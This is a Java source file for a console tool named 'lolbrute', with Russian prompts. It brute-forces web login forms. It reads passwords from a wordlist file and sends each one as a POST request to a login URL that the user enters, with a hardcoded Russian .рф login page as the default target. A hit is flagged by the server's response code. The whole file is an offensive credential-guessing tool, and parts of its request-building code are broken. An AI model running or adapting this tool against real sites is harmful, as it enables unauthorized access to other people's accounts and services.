package lolbruteMain;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.LineNumberReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;
import java.util.Map;
import java.util.Scanner;
import java.util.stream.Stream;

public class Brute {

	final public static String Correct = "✓";
	final public static String Incorrect = "×";
	public static int response;
	private static final String USER_AGENT = "Mozilla/5.0";
	private static String addr = "https://xn--80atdl2c.xn--33-6kcadhwnl3cfdx.xn--p1ai/auth/login";
	private static String POST_PARAMS1 = "login_login=Hello";
	private static String POST_PARAMS2 = "login_password=Hell2o";
	private static String POST_PARAMSForm1 = "login_login";
	private static String POST_PARAMSForm2 = "login_password";
	
	public static void main(String[] args) throws InterruptedException, IOException {
		System.out.println("Как?");
		Scanner scanner = new Scanner(System.in);	
		int Kak = scanner.nextInt();
		switch(Kak) {
		case 1:
			one();
			break;
		case 2:
			two();
			break;
		} 
	}
	public static void one() throws InterruptedException {
		String slovar[] = {"a", "b", "c", "d", "e", "o", "f", "q", "w", "r", "t", "y", "u", "i", "o", "p", "l", "k", "j", "h", "z", "x", "v", "n", "m", "g", "h", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"};
		System.out.println("Сколько итераций? (Прим. 0 - весь словарь)");
		Scanner scannerIterration = new Scanner(System.in);	
		int Iterration = scannerIterration.nextInt(); // itteration
		int massiveLeng = slovar.length;
		System.out.println("Какое время задать?");
		Scanner scannerTime = new Scanner(System.in);	
		int time = scannerTime.nextInt(); // in msec
		if(Iterration == 0) {
			Iterration = massiveLeng;
		}
		for(int i = 0; i < Iterration; i++) {
			Thread.sleep((long) (time*1000));
			System.out.println(slovar[i]); // input
		}
	}
	  
	private static void sendPOST(String readerd) throws IOException {
		  URL obj = new URL(addr);
		  HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		  con.setRequestMethod("POST");
		  con.setRequestProperty("User-Agent", USER_AGENT);
		  con.setRequestProperty(POST_PARAMSForm1, POST_PARAMS1);
		  con.setRequestProperty(POST_PARAMSForm2, POST_PARAMS2 + readerd); // pass

		  // For POST only - START
		  con.setDoOutput(true);
		  OutputStream os = con.getOutputStream();
		  os.write(POST_PARAMS1.getBytes());
		  os.write(POST_PARAMS2.getBytes());
		  os.flush();
		  os.close();
		  // For POST only - END

		  int responseCode = con.getResponseCode();
		  Brute.response = responseCode;
		  if (responseCode == HttpURLConnection.HTTP_OK) {
		  BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		  String inputLine;
		  StringBuffer response = new StringBuffer();

		  while ((inputLine = in.readLine()) != null) {
		  response.append(inputLine);
		  }
		  in.close();

		  // print result
		  System.out.println(response.toString());
		    } 
		 }
	   
	   public static void timer(int iterration, float times) throws InterruptedException {
		   int time = 0;
		   for(int i = 0; i < iterration; i++) {
			   time += times;
			   Thread.sleep((long) times);
		   }
		   System.out.println(time + " секунд");
	   }
	
	@SuppressWarnings("unlikely-arg-type")
	public static void two() throws InterruptedException, IOException {
		System.out.println("Путь к файлу (словарю)");
		Scanner FileScan = new Scanner(System.in);
			String File1 = FileScan.nextLine(); // File
			System.out.println("Время (прим. 0 - значение по умолчанию, 200 миллисекунд) {указывать в миллисекундаx}");
			Scanner scannerTime = new Scanner(System.in);
			float time = scannerTime.nextFloat(); // in sec
			System.out.println("Адрес страницы для подбора");
			Scanner addrsTo = new Scanner(System.in);
			String address = addrsTo.nextLine(); // address of server
			addr = address;
			System.out.println("Сам запроc логина на авторизацию (прим. его можно найти в коде HTML) [пример - username=ТутВашЛогин]");
			Scanner req = new Scanner(System.in);
			String reqestLogin = addrsTo.nextLine();
			POST_PARAMS1 = reqestLogin;
			System.out.println("Сам запроc пароля на авторизацию (прим. его можно найти в коде HTML) [пример - password=] и в конце password=, ничего вписывать не надо!");
			Scanner reqpass = new Scanner(System.in);
			String reqestPass = addrsTo.nextLine();
			POST_PARAMS2 = reqestPass;
			System.out.println("Форма запроса логина");
			Scanner logins = new Scanner(System.in);
			String loginsReq = addrsTo.nextLine();
			POST_PARAMSForm1 = loginsReq;
			System.out.println("Форма запроса пароля");
			Scanner passw = new Scanner(System.in);
			String passwReq = addrsTo.nextLine();
			POST_PARAMSForm2 = passwReq;
			System.out.println("Что должен ответить сервер при удачной попытке? [пример 200 - OK]");
			Scanner response = new Scanner(System.in);
			int responseReq = addrsTo.nextInt();
			System.out.println("Кол-во потоков");
			Scanner threads = new Scanner(System.in);
			int threadss = addrsTo.nextInt();
			if(time == 0) {
				time = (int) 0.2;
			}
			File file = new File(File1);
			Scanner scanner = new Scanner(file);
			var lnr = new LineNumberReader(new BufferedReader(new FileReader(file)));
			while (lnr.readLine() != null);
			int lines = lnr.getLineNumber();
			BufferedReader reader = new BufferedReader(new FileReader(file));
			while(scanner.hasNextLine()) {
			for(int i = 0; i < lines ; i++) {
				Thread.sleep((long) ((float)time*1000));
			    String Read = (scanner.nextLine()); 
			    sendPOST(Read); // подбор к паролю
				if(Brute.response == responseReq) {
					System.out.println(Read + " " + Correct + " \nЭтот пароль верный или страница вернула иной код");
					  System.exit(0);
						} else {
					  System.out.println(Read + " " + Incorrect + " Response Code: " + Brute.response); 
					}
				}
			timer(lines, time);
			main(null);
		  }
     }
}